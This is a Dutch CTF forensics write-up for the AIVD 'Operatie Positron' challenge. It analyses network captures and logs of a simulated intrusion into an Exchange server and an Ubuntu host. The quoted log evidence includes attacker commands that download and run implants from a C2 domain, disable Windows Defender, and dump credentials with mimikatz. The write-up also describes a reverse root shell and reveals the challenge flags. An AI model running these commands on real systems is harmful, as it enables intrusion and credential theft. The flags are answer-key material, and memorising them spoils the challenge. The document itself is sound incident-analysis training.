# Operatie Positron

## Aflevering 1: Welkom in Cyberspace

Deze aflevering heeft 1 vlag. Allereerst lezen we het inzetverzoek en het rapport van voorgaand onderzoek. Wat opvalt is de PCAP en de surricata regels. We verwachten de vlag te vinden in communicatie van de ROOKWORST implant in het netwerkverkeer in `ROOKWORST.pcap`


### Het netwerkverkeer in ROOKWORST.pcap

Als we de pcap file openen in Wireshark vallen gelijk 2 dingen op:
- De URL pannenkoekenpalazzo wordt gebruikt als C&C domain.
- De beacon data is encoded al dan niet encrypt.
```
POST /contact/formulier/ HTTP/1.1
Host: pannenkoekenpalazzo.nl
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:42.0) Gecko/20100101 Firefox/42.0
Cookies: PHPSESSID=5d1a4d1f1d13890f54a26588b73f0ad7
Accept: */*
Accept-Language: en-US;q=0.7,en;q=0.3
Content-Type: text/plain
Content-Length: 28
Accept-Encoding: gzip, deflate, br

data=wUNAp6Rl3cqyree2vjCqF8A
```

## Aflevering 2: Pim's heilige uurtje


### Logs & PCAP
#### Logs

##### auth.log

Uit de `auth.log` file halen we meerdere SSH connecties vanaf IP 10.42.42.4 via poort 48594 met het root account. Helaas vinden we geen SSH verkeer in de PCAP.
```
$ cat auth.log | grep port
Feb  7 05:43:55 ubuntu sshd[10558]: Server listening on 0.0.0.0 port 22.
Feb  7 05:43:55 ubuntu sshd[10558]: Server listening on :: port 22.
Feb  7 05:47:13 ubuntu sshd[17400]: Accepted password for root from 10.42.42.4 port 45382 ssh2
Feb  7 06:07:48 ubuntu sshd[17400]: Received disconnect from 10.42.42.4 port 45382:11: disconnected by user
Feb  7 06:07:48 ubuntu sshd[17400]: Disconnected from user root 10.42.42.4 port 45382
Feb  7 15:36:08 ubuntu sshd[2283]: Accepted password for root from 10.42.42.4 port 48594 ssh2
Feb  7 15:39:03 ubuntu sshd[2283]: Received disconnect from 10.42.42.4 port 48594:11: disconnected by user
Feb  7 15:39:03 ubuntu sshd[2283]: Disconnected from user root 10.42.42.4 port 48594
```

##### bash_history

Uit de file `bash_history` vernemen we dat een sessie een file heeft download vanaf een URL naar het RAM geheugen in `/dev/shm`:

```
cd /dev/shm
wget http://pannenkoekenpalazzo.nl:8444/foodtruck/apt-update
ls
chmod +x apt-update 
file apt-update 
(nohup ./apt-update &)
ps auxwfewwwwwwwwwwww | grep apt-
```

De URL zijn we eerder tegen gekomen in de vorige aflevering. Dit lijkt dezelfde URL te zijn als waar de C&C communicatie vandaan kwam. De poort op de URL lijkt op het moment van schrijven niet bereikbaar.

##### eventlog.evtx

De EVTX file heb ik geconvert naar een JSON readable text file via [deze](https://github.com/omerbenamram/evtx) tool.

Uit de eventlog van de Domain Controller van domein electron zien we dat de DC logs heeft van connecties met de IP adressen 10.42.42.2-5

De computer EXCHANGE.electron.local (10.42.42.4) lijkt daar de realtime AV monitoring te disablen zoals te zien in Record 524, gelogd op 2022-02-07T14:27:35Z. Het parent process hiervan is `w3wp.exe`, de worker van IIS, een webserver. Kortom, interessant.
```
"EventData": {
      "CommandLine": "\"cmd.exe\" /c powershell.exe -C set-mppreference -disablerealtimemonitoring $true",
      "MandatoryLabel": "S-1-16-16384",
      "NewProcessId": "0x2d14",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
      "ProcessId": "0x2340",
      "SubjectDomainName": "ELECTRON",
      "SubjectLogonId": "0x3e7",
      "SubjectUserName": "EXCHANGE$",
      ...
```
Vervolgens lijkt het er op dat er een shell wordt geopend in Record 525. In die shell wordt vervolgens, gezien 525 hetzelfde commando gerunt. Er lijken powershell scripts gerunt te worden. Hierna worden de accounts `ADC$` and `WEC$` uitgelogd. Wat dit precies betekend kunen we niet met zekerheid zeggen. Wellicht is dit gewoon legit.

Nu we filteren op `w3wp.exe` zien we gelijk entry 691. Hier wordt vanaf de C&C server de windows variant van de implant gedownload op de Exchange server. BINGO! Als we vervolgens op alle commands vanuit parentsprocess `w3wp.exe` filteren met hun timestamp krijgen we het volgende overzicht:

```
$ cat eventlog.json | grep -F '     "ParentProcessName": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",' -B 4 -A 60 | egrep "SystemTime|CommandLine" | cut -d ":" -f 2,3,4,5,6,7,8,9| paste -d " "  - -  | awk -F, '{ print $2 " " $1}'
  "2022-02-07T14:26:49.728120000Z"  "\"cmd.exe\" /c whoami"
  "2022-02-07T14:26:51.385421700Z"  "\"cmd.exe\" /c pwd"
  "2022-02-07T14:26:54.897481200Z"  "\"cmd.exe\" /c dir"
  "2022-02-07T14:26:57.753397500Z"  "\"cmd.exe\" /c hostname"
  "2022-02-07T14:27:02.014996700Z"  "\"cmd.exe\" /c net user /domain"
  "2022-02-07T14:27:08.188473600Z"  "\"cmd.exe\" /c whoami /all"
  "2022-02-07T14:27:35.510753100Z"  "\"cmd.exe\" /c powershell.exe -C set-mppreference -disablerealtimemonitoring $true"
  "2022-02-07T14:28:14.357667500Z"  "\"cmd.exe\" /c certutil.exe -urlcache -split -f http://pannenkoekenpalazzo.nl:8443/foodtruck/mimikatz.exe c:\\programdata\\smint.exe"
  "2022-02-07T14:28:50.630421500Z"  "\"cmd.exe\" /c certutil.exe -urlcache -split -f http://pannenkoekenpalazzo.nl:8443/foodtruck/wsupdate.exe C:\\programdata\\wsupdate.exe"
  "2022-02-07T14:28:57.141322900Z"  "\"cmd.exe\" /c dir c:\\programdata\\"
  "2022-02-07T14:29:36.747893500Z"  "\"cmd.exe\" /c C:\\programdata\\smint.exe privilege::debug sekurlsa::logonpasswords exit > c:\\programdata\\out.dat"
  "2022-02-07T14:29:42.212979800Z"  "\"cmd.exe\" /c dir c:\\programdata\\"
  "2022-02-07T14:29:55.660348900Z"  "\"cmd.exe\" /c type c:\\programdata\\out.dat"
  "2022-02-07T14:30:13.922407800Z"  "\"cmd.exe\" /c del c:\\programdata\\smint.exe"
  "2022-02-07T14:30:22.099484800Z"  "\"cmd.exe\" /c dir c:\\programdata\\"
  "2022-02-07T14:30:27.133632700Z"  "\"cmd.exe\" /c tasklist /v"
  "2022-02-07T14:34:27.801552300Z"  "\"cmd.exe\" /c powershell.exe -C set-mppreference -disablerealtimemonitoring $false"
  "2022-02-07T14:34:32.150922800Z"  "\"cmd.exe\" /c exit"
```
Wat ons opvalt is het volgende:
- Windows defender realtime scanning AV wordt disabled
- wsupdate.exe
    - de ROOKWORST implant, voor communicatie naar C&C.
- Mimikatz
    - Huidige verwachting is dat de wachtwoorden uit `lsass.exe` gebruikt zijn om te pivoten naar andere systemen (zoals Linux host 10.42.42.200)


#### PCAP

Uit de PCAP `netwerkverkeer.pcap` halen we een infected IP 10.42.42.200

Daarnaast weten we dat de malware communiceert over HTTP met de C&C. Hier kunnen we op filteren in Wireshark:

`ip.src == 10.42.42.200 or ip.dst == 10.42.42.200 and http`

Uit de PCAP kunnen we uitmaken dat de malware elke 5 seconden een HTTP GET request stuurt naar `pannenkoekenpalazzo.nl/contact`. Vanaf seconde 11 tot 59 is er een open Reverse root shell, deze is te volgen via TCP stream 13. Na 60 seconden volgt een HTTP POST naar `pannenkoekenpalazzo.nl/contact/formulier/`



##### FLAG: Reverse root shell 10.42.42.200
De root shell is gestart vanaf poort 40834 naar poort 8445 op IP 93.119.10.238, waar ook het domein `pannenkoekenpalazzo.nl` gehost wordt. 

Als we de TCP stream volgen in Wireshark, zien we al het shell verkeer. In het verkeer kunnen we de **flag** `POSITRON{C4t_fl4g.txt_h0w_d1d_th3y_g3t_h3r3?}` vinden:
```
$ grep -E "#|POSITRON" TCP\ steam\ shell.txt 
.]0;root@ubuntu: /dev/shm.root@ubuntu:/dev/shm# w
.]0;root@ubuntu: /dev/shm.root@ubuntu:/dev/shm# cd /
.]0;root@ubuntu: /.root@ubuntu:/# ls -al
.]0;root@ubuntu: /.root@ubuntu:/# ls -al /root
.]0;root@ubuntu: /.root@ubuntu:/# ps
.]0;root@ubuntu: /.root@ubuntu:/# ps auxfw
.]0;root@ubuntu: /.root@ubuntu:/# cd electron_share
.]0;root@ubuntu: /electron_share.root@ubuntu:/electron_share# ls -al
.]0;root@ubuntu: /electron_share.root@ubuntu:/electron_share# cat flag.txt
POSITRON{C4t_fl4g.txt_h0w_d1d_th3y_g3t_h3r3?}
.]0;root@ubuntu: /electron_share.root@ubuntu:/electron_share# exit
```

Wat ons daarnaast opvalt is dat we de file `apt-update` zien draaien als root user. Ook draait de reverse shell zo te zien als childprocess in `gssproxy`, een proxy daemon voor de  GSS-API. `gssproxy` wordt zo te zien gebruikt in de implant `apt-update`, waar het een chilprocess van is:
```
root        2375  0.0  0.0 207872  3308 ?        Sl   15:37   0:00 ./apt-update
root        2540  0.0  0.1  20204  4024 pts/1    Ss   15:41   0:00  \_ /usr/sbin/gssproxy
root        2568  0.0  0.0  22288  3728 pts/1    R+   15:41   0:00      \_ ps auxfw
```


Kortom, de initiele infectie met ROOKWORST, waarschijnlijk door middel van de `apt-update` file, gebeurde voordat de het netwerkverkeer werd gecaptured in deze PCAP. We missen de intiele infectie, ook gezien het ontbreken van de HTTP request naar poort 8445 op de C&C vanwaar de vemoedelijke ROOKWORST implant is gedownload.

##### Systeem overview
Zo te zien hebben we dus de volgende systemen:

- 10.42.42.2
    - De Windows Domain Controller
- 10.42.42.3
- 10.42.42.4
    - De gecompromiteerde Windows Exchange server
- 10.42.42.5
- 10.42.42.200
    - De gecompromiteerde Linux server
    
#### Vragen



##### Hoe heeft ZUURKOOL zijn initial access verkregen?

Het ziet er naar uit dat ZUURKOOL een kwetsbaarheid op de Exchange server heeft gevonden, die een RCE via het `w3wp.exe` process heeft getriggerd. Vanuit die positie heeft ZUURKOOL Mimikatz uitgevoerd, en hoogstwaarschijnlijk met de gecompromiteerde wachtwoorden geprobeerd in te loggen op andere systemen. En zo via een SSH connectie vanaf de Exchange host (zie de `auth.log` findings) de Ubuntu host kunnen compromiteren.

##### Op welk ander systeem, naast de initial access server, heeft ZUURKOOL toegang verkregen?

De Linux Ubuntu host op 10.42.42.200.

##### Welke commando’s heeft ZUURKOOL op welk systeem en op welk tijdstip uitgevoerd?

*Exchange.electron.local @ 10.42.42.4*
```
  "2022-02-07T14:26:49.728120000Z"  "\"cmd.exe\" /c whoami"
  "2022-02-07T14:26:51.385421700Z"  "\"cmd.exe\" /c pwd"
  "2022-02-07T14:26:54.897481200Z"  "\"cmd.exe\" /c dir"
  "2022-02-07T14:26:57.753397500Z"  "\"cmd.exe\" /c hostname"
  "2022-02-07T14:27:02.014996700Z"  "\"cmd.exe\" /c net user /domain"
  "2022-02-07T14:27:08.188473600Z"  "\"cmd.exe\" /c whoami /all"
  "2022-02-07T14:27:35.510753100Z"  "\"cmd.exe\" /c powershell.exe -C set-mppreference -disablerealtimemonitoring $true"
  "2022-02-07T14:28:14.357667500Z"  "\"cmd.exe\" /c certutil.exe -urlcache -split -f http://pannenkoekenpalazzo.nl:8443/foodtruck/mimikatz.exe c:\\programdata\\smint.exe"
  "2022-02-07T14:28:50.630421500Z"  "\"cmd.exe\" /c certutil.exe -urlcache -split -f http://pannenkoekenpalazzo.nl:8443/foodtruck/wsupdate.exe C:\\programdata\\wsupdate.exe"
  "2022-02-07T14:28:57.141322900Z"  "\"cmd.exe\" /c dir c:\\programdata\\"
  "2022-02-07T14:29:36.747893500Z"  "\"cmd.exe\" /c C:\\programdata\\smint.exe privilege::debug sekurlsa::logonpasswords exit > c:\\programdata\\out.dat"
  "2022-02-07T14:29:42.212979800Z"  "\"cmd.exe\" /c dir c:\\programdata\\"
  "2022-02-07T14:29:55.660348900Z"  "\"cmd.exe\" /c type c:\\programdata\\out.dat"
  "2022-02-07T14:30:13.922407800Z"  "\"cmd.exe\" /c del c:\\programdata\\smint.exe"
  "2022-02-07T14:30:22.099484800Z"  "\"cmd.exe\" /c dir c:\\programdata\\"
  "2022-02-07T14:30:27.133632700Z"  "\"cmd.exe\" /c tasklist /v"
  "2022-02-07T14:34:27.801552300Z"  "\"cmd.exe\" /c powershell.exe -C set-mppreference -disablerealtimemonitoring $false"
  "2022-02-07T14:34:32.150922800Z"  "\"cmd.exe\" /c exit"

```

*ubuntu @ 10.42.42.200*

Tussen 2022-02-07T14:41:04Z en 2022-02-07T14:41:52Z
```
# w
# cd /
# ls -al
# ls -al /root
# ps
# ps auxfw
# cd electron_share
# ls -al
# cat flag.txt
# exit
```


##### Welke mogelijkheden had ZUURKOOL om credentials voor dat systeem te bemachtigen

ZUURKOOL heeft de credentials bemachtigd van `Exchange.electron.local` door Mimikatz te runnen en de credentials van `lsass.exe` te dumpen.



### Binaries

We hebben twee implant binaries veilig weten te stellen bij Electron B.V. Ze zaten op twee verschillende systemen en lijken variaties te zijn voor Windows en Linux.


#### FLAG: Strings

De eerste flag kunnen we vinden door `strings` te runnen op de binary `apt-update`:
```
C, Port: Mode: , IP: , Username: , Password: Dit programma is onderdeel van de challenges bij de AIVD podcast 'De Dienst: Operatie Positron'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
/contact//contact/reserveren/contact/formulier/
POSITRON{34syfl4g_w1th_str1ngs_n0g_tw33_t3_g44n}ROTATE_SCHEDULEe206a54e97690cce50cc872dd70ee896assertion failed: (*tail).value.is_none()/rustc/6abb6385b2cb7249f67b9b3ce7522527767dd907/library/std/src/sync/mpsc/mpsc_queue.rsassertion failed: (*next).value.is_some()
```

Als we beide binaries analyzen in Ghidra, zien we dat de decompiler flink moeite heeft. Het lijkt er op dat de implant een SOCKS server draait met RC4 of chacha20 encryptie. Ook komen we de verwijzing "main_stage" tegen. Ook zijn er 3 urls te vinden

#### Vragen
##### Hoe ziet het communicatieprotocol van de implant eruit?

##### Welke crypto algorithmen worden gebruikt en welke sleutels en instellingen horen daarbij?

##### Welke functionaliteiten biedt de implant voor de operator?

##### Wat is de interne naam van de implant-suite?

main_stage?
